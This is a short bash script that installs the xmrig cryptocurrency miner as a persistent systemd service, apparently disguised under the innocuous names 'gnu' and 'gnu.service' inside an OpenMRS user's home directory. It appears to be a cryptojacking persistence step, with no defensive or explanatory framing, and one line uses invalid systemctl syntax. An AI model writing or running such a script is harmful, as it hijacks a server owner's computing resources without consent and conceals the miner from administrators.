#! /usr/bin/bash

sudo chmod +x xmrig
sudo ln -s /home/openmrs/gnu/xmrig link
mv gnu.service /etc/systemd/system
sudo systemctl chmod 664 /etc/systemd/system/gnu.service
sudo systemctl daemon-reload
sudo systemctl enable gnu.service
sudo systemctl restart gnu.service
